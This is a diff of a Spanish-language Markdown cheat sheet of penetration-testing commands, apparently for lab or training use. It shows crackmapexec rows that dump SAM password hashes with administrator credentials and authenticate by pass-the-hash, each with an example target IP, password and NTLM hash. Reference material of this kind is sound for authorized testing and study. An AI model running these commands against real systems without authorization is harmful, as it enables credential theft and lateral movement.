@@ -1,4 +1,3 @@
-
 ## Enumeración
 
 | Comando                                                                                                                                           | Descripción                                                                                                                                                                                              | Ejemplo                                             |
@@ -32,8 +31,6 @@
 | crackmapexec smb <ip_víctima> -u \<usuario> -p \<contraseña> --sam                                | Extrae los hashes SAM (Security Account Manager) del sistema remoto si el usuario tiene privilegios administrativos. Permite obtener los hashes de las cuentas locales.                 | crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam             |
 | crackmapexec smb <ip_víctima> -u \<usuario> -H \<NTLM_hash>                                       | Autenticación mediante hash NTLM en lugar de contraseña en texto claro (técnica “Pass-the-Hash”). Útil cuando tienes el hash pero no la contraseña.                                     | crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE |
 |                                                                                                   |                                                                                                                                                                                         |                                                                                    |
-
-
 ## Varios
 
 | Comando                                            | Descripción                                                                                                                                                                                                                                          | Ejemplo                                                   |
